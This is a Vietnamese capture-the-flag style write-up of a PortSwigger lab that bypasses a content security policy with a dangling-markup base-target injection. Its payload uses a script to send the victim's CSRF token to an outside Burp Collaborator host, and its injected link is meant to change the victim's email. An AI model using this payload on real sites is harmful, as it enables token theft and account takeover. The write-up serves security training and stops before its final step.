# Target Goal: 

This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

# Recon: 

Phần nhắm đến để tấn công sẽ là đổi email do đó từ mục nhập email, ta có thể inject vào và thử xem có thể thoát ra dc k

![image](https://github.com/vanniichan/Portswigger/assets/112863484/018f0ae1-3160-408f-b92f-9d18642a52f3)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/c7e5527d-0cfd-4ce2-949d-532b1bce17b9)

Sau khi inject vào cta thấy được k thể xem được nội dung của link. Lý do như tiêu đề của bài lab. Nó đã được CSP bảo vệ

![image](https://github.com/vanniichan/Portswigger/assets/112863484/78aa0fb3-1ed8-4f6d-b540-3368f72dcb5e)

Vậy thì bypass CSP kiểu gì? Vì nó đã chặn xem nội dung của trang ngoài nên chúng ta k thể tiến hành tấn công tự động mà bắt buộc phải cần tương tác 
`<a href="https://google.com/dnkas">Click me</a>`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4b13d7cc-2a9b-4ea2-8bef-11576f981fdc)

Tiếp theo để lấy được nội dung, rằng ở đây chúng ta cần đó chính là csrf token thậm chí là nhiều hơn thế. Sử dụng [tag base target](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/b4183055-b526-4f76-8d30-2921ff10a8f7)

Lý do k đóng " là bởi khi không đóng. Trình duyệt sẽ hiểu rằng nội dung của nó sẽ chưa kết thúc và sẽ tìm đến phần kết thúc khác ( ở đâu có thể hiểu được là phần đóng tag ở dưới). Đây chính là tấn công "dangling markup"

![image](https://github.com/vanniichan/Portswigger/assets/112863484/2a9056c8-15b3-4c81-ab1f-785a64d38042)

Từ trên ta có payload sau: Nếu chưa có thông tin gì (window.name) thì ta sẽ dùng `else` mục đích giải thích ở trên. Sau đó khi đã có thông tin nó sẽ gửi về request của `Burp collabor`

```
<script>
if(window.name) {
		new Image().src='//wqqef7ejd38jegvd09sykz0ujlpcd21r.oastify.com?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://0ae2000b04d9e4b480f02bf300bb00dd.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a4800bf0403e41f80932a5001200097.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

Sau khi lấy được csrf từ victim ta tiến hành thay đổi email. Tuy nhiên respond sẽ báo rằng invalid csrf token lý do là thực ra mình còn thiếu session của victim




# Flag: 

